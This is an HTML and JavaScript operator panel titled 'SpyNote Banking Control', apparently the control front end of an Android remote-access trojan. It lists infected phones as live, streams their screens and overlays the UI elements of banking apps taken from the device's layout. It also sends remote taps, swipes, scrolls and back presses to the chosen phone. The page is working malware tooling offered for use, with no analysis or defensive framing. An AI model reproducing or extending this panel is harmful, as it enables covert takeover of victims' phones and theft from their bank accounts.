<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Banking Control</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,0,0,0.9); padding: 15px; 
            max-height: 80vh; overflow-y: auto; width: 300px; 
            border-radius: 10px; backdrop-filter: blur(10px);
        }
        .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
            border-radius: 8px; transition: all 0.3s; }
        .device:hover { background: #555; transform: translateX(5px); }
        .active { background: #00ff88 !important; color: #000; }

        #phone-frame {
            width: 400px; height: 800px; margin: 20px auto; 
            background: #000; border: 25px solid #333; border-radius: 50px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        #screen { 
            width: 100%; height: 100%; background: #111; border-radius: 20px;
            image-rendering: pixelated; position: relative;
        }

        /* üî• BANKING LAYOUT OVERLAY */
        .ui-element {
            position: absolute; border-radius: 4px; font-size: 11px; 
            padding: 2px 4px; cursor: pointer; backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.3); transition: all 0.2s;
        }
        .ui-text { background: rgba(0,255,136,0.8); color: #000; }
        .ui-button { background: rgba(255,107,53,0.9); color: white; }
        .ui-search { background: rgba(59,130,246,0.9); color: white; }
        .ui-element:hover { transform: scale(1.2); box-shadow: 0 0 10px rgba(0,255,136,0.8); }
        .ui-element.clickable { border: 2px solid #ffeb3b; }

        #fps-counter { position: fixed; top: 10px; right: 150px; font-size: 12px; color: #00ff88; }
        #status { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
            padding: 10px; border-radius: 5px; font-size: 12px; }
        #controls { text-align: center; position: fixed; bottom: 20px; 
            left: 50%; transform: translateX(-50%); }
        button {
            padding: 12px 25px; margin: 0 5px; background: linear-gradient(45deg, #007bff, #0056b3); 
            color: white; border: none; border-radius: 20px; cursor: pointer; 
            font-size: 14px; font-weight: bold; transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0,123,255,0.4);
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,123,255,0.6); }
        button.active { background: linear-gradient(45deg, #00ff88, #00cc66); }
        .scroll-btn { background: linear-gradient(45deg, #ff6b35, #e55a2b) !important; }
        #element-list { 
            position: fixed; bottom: 100px; left: 20px; 
            background: rgba(0,0,0,0.95); padding: 15px; 
            max-height: 200px; overflow-y: auto; width: 280px; 
            border-radius: 10px; display: none;
        }
        .element-item { 
            padding: 8px; margin: 4px 0; background: #444; 
            cursor: pointer; border-radius: 6px; font-size: 12px;
        }
        .element-item:hover { background: #666; }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Banking Control</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="status">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | <span id="selectedDevice">-</span></div>
    </div>
    <div id="fps-counter">FPS: 0</div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="element-list">
        <h4>üîç Found Elements:</h4>
        <div id="elements"></div>
    </div>

    <div id="controls">
        <button onclick="toggleLayoutOverlay()" id="layoutBtn">üëÅÔ∏è Layout</button>
        <button onclick="sendBack()" id="backBtn">üîô Back</button>
        <button onclick="toggleScroll()" id="scrollBtn">‚ÜïÔ∏è Scroll</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] });
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let lastFrameTime = 0, frameCount = 0;
        let scrollMode = false;
        let showLayout = true;
        let uiElements = [];
        let dragging = false;
        let startX = 0, startY = 0;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsCounter = document.getElementById('fps-counter');
        const fpsDisplay = document.getElementById('fps');
        const elementList = document.getElementById('element-list');
        const elementsDiv = document.getElementById('elements');

        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // üî• LIVE SCREEN
        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            try {
                deviceWidth = data.width;
                deviceHeight = data.height;
                
                const img = new Image();
                img.onload = () => {
                    const rect = phoneFrame.getBoundingClientRect();
                    canvas.width = rect.width;
                    canvas.height = rect.height;
                    
                    ctx.imageSmoothingEnabled = false;
                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
                    
                    // üî• DRAW LAYOUT OVERLAY
                    drawLayoutOverlay(rect);
                    
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        fpsCounter.textContent = `FPS: ${fps}`;
                        fpsDisplay.textContent = fps;
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                };
                img.src = 'data:image/jpeg;base64,' + data.data;
            } catch (e) {
                console.error('Screen error:', e);
            }
        });

        // üî• BANKING LAYOUT DATA
        socket.on('ui-layout-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            uiElements = data.elements || [];
            updateElementList();
        });

        fetch('/devices').then(r => r.json()).then(updateDeviceList);

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device" onclick="selectDevice('${id}', this)">
                        <b>${info.model || id.slice(0,8)}</b><br>
                        <small>${info.brand} ${info.version || ''}</small>
                        üü¢ LIVE
                    </div>
                `).join('') : 'No devices';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDevice.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
        }

        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // üî• DRAW LAYOUT OVERLAY
        function drawLayoutOverlay(rect) {
            if (!showLayout || uiElements.length === 0) return;
            
            const scaleX = rect.width / deviceWidth;
            const scaleY = rect.height / deviceHeight;
            
            uiElements.forEach(el => {
                const overlay = document.getElementById(`ui-${el.id}`);
                if (!overlay) {
                    const div = document.createElement('div');
                    div.id = `ui-${el.id}`;
                    div.className = `ui-element ui-${el.type}`;
                    div.textContent = el.text || el.className || '?';
                    div.style.left = `${el.bounds.left * scaleX}px`;
                    div.style.top = `${el.bounds.top * scaleY}px`;
                    div.style.width = `${(el.bounds.right - el.bounds.left) * scaleX}px`;
                    div.style.height = `${(el.bounds.bottom - el.bounds.top) * scaleY}px`;
                    div.onclick = () => clickElement(el);
                    document.getElementById('screen').appendChild(div);
                }
            });
        }

        function updateElementList() {
            elementsDiv.innerHTML = uiElements.map(el => `
                <div class="element-item" onclick="clickElementByText('${el.text || el.className}')">
                    ${el.type === 'button' ? 'üîò' : el.type === 'text' ? 'üìù' : 'üîç'}
                    ${el.text || el.className || 'Unknown'} (${Math.round(el.bounds.left)},${Math.round(el.bounds.top)})
                </div>
            `).join('');
        }

        function clickElement(element) {
            sendControl('tap', element.bounds.centerX, element.bounds.centerY, element.text);
        }

        function clickElementByText(text) {
            const el = uiElements.find(e => (e.text || e.className || '').includes(text));
            if (el) clickElement(el);
        }

        // üî• Touch Controls
        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                
                if (scrollMode) {
                    const scrollDistance = coords.y - startY;
                    sendControl('scroll', 0, scrollDistance);
                } else {
                    sendControl('swipe', startX, startY, coords.x, coords.y);
                }
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                dragging = false;
                
                if (!scrollMode) {
                    sendControl('tap', startX, startY);
                }
            });
        });

        function sendControl(action, x, y, endX, endY, scrollDistance, elementText) {
            socket.emit('control', { 
                deviceId: currentDevice, 
                action, 
                x, y, 
                endX, endY, 
                scrollDistance,
                elementText
            });
        }

        function sendTap(x, y) {
            sendControl('tap', x, y);
        }

        function sendSwipe(sx, sy, ex, ey) {
            sendControl('swipe', sx, sy, ex, ey);
        }

        function sendScroll(distance) {
            sendControl('scroll', 0, distance);
        }

        function sendBack() {
            sendControl('back');
        }

        function toggleScroll() {
            scrollMode = !scrollMode;
            document.getElementById('scrollBtn').textContent = scrollMode ? 'üëÜ Normal' : '‚ÜïÔ∏è Scroll';
        }

        function toggleLayoutOverlay() {
            showLayout = !showLayout;
            document.querySelectorAll('.ui-element').forEach(el => el.remove());
            document.getElementById('layoutBtn').textContent = showLayout ? 'üôà Hide' : 'üëÅÔ∏è Layout';
            document.getElementById('element-list').style.display = showLayout ? 'block' : 'none';
        }
    </script>
</body>
</html>
